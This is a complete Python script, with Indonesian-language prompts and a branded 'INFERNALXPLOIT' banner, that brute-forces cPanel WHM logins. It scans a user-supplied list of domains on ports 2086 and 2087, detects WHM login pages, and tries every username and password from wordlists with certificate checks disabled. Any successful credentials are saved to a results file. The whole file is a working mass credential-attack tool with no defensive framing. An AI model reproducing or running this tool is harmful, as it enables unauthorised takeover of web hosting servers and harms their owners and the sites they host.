import requests
import random
import os
import time

# Warna
MERAH = "\033[91m"
HIJAU = "\033[92m"
PUTIH = "\033[97m"
RESET = "\033[0m"

# Banner
def banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(f"""{MERAH}
██╗    ██╗██╗  ██╗███╗   ███╗       ██████╗██████╗  █████╗  ██████╗██╗  ██╗
██║    ██║██║  ██║████╗ ████║      ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
██║ █╗ ██║███████║██╔████╔██║█████╗██║     ██████╔╝███████║██║     █████╔╝
██║███╗██║██╔══██║██║╚██╔╝██║╚════╝██║     ██╔══██╗██╔══██║██║     ██╔═██╗
╚███╔███╔╝██║  ██║██║ ╚═╝ ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝     ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
{PUTIH}        INFERNALXPLOIT - WHM LOGIN BRUTEFORCE
{HIJAU}         SUPPORT PORT 2086 & 2087 | FULL INDO
{RESET}
""")

# Ambil input dari user
def ambil_input():
    print(f"{PUTIH}[!] Masukkan daftar website (tanpa http/https, hanya domain/IP):{RESET}")
    daftar_web = input(f"{HIJAU}>>> File list website : {RESET}")
    daftar_user = input(f"{HIJAU}>>> File list username: {RESET}")
    daftar_pass = input(f"{HIJAU}>>> File list password: {RESET}")
    return daftar_web, daftar_user, daftar_pass

# Load isi file
def load_list(nama_file):
    try:
        with open(nama_file, 'r') as f:
            return [x.strip() for x in f if x.strip()]
    except Exception as e:
        print(f"{MERAH}[X] Gagal membaca file: {nama_file} - {e}{RESET}")
        time.sleep(5)
        exit()

# Coba login WHM
def coba_login(url, user, password):
    login_url = url + 'login/?login_only=1'
    data = {
        'user': user,
        'pass': password,
        'goto_uri': '%2F'
    }
    try:
        req = requests.post(login_url, data=data, timeout=10, verify=False, allow_redirects=True)
        if 'security_token' in req.text or 'redirect' in req.text:
            return True
    except:
        pass
    return False

# Jalankan brute force
def mulai(daftar_web, list_user, list_pass):
    print(f"{PUTIH}[•] Jumlah username : {len(list_user)}")
    print(f"[•] Jumlah password : {len(list_pass)}{RESET}")
    print("")

    hasil_file = open("HASIL_WHM_VALID.txt", "a+")

    for port in ["2086", "2087"]:
        print(f"{MERAH}\n[!] Memulai scan WHM port {port}{RESET}")
        scheme = "https" if port == "2087" else "http"

        for target in daftar_web:
            url = f"{scheme}://{target}:{port}/"

            try:
                resp = requests.get(url, timeout=8, verify=False)
                if "WHM" in resp.text and "login" in resp.text:
                    print(f"{HIJAU}[√] WHM Terbuka: {url}{RESET}")
                    
                    for user in list_user:
                        for password in list_pass:
                            print(f"{PUTIH}[•] Coba login: {user}:{password}{RESET}")
                            if coba_login(url, user, password):
                                print(f"{HIJAU}[√] LOGIN VALID => {url} | {user} | {password}{RESET}")
                                hasil_file.write(f"{url} | {user} | {password}\n")
                                hasil_file.flush()
                                break  # Stop di kombinasi valid
                            else:
                                print(f"{MERAH}[X] Gagal => {user}:{password}{RESET}")
                else:
                    print(f"{MERAH}[!] WHM tidak terdeteksi di: {url}{RESET}")
            except Exception as e:
                print(f"{MERAH}[!] Koneksi error/Timeout => {url} | {e}{RESET}")

    hasil_file.close()

# Main
if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()  # Supress SSL warnings
    banner()
    daftar_web, daftar_user, daftar_pass = ambil_input()
    web_list = load_list(daftar_web)
    user_list = load_list(daftar_user)
    pass_list = load_list(daftar_pass)
    mulai(web_list, user_list, pass_list)
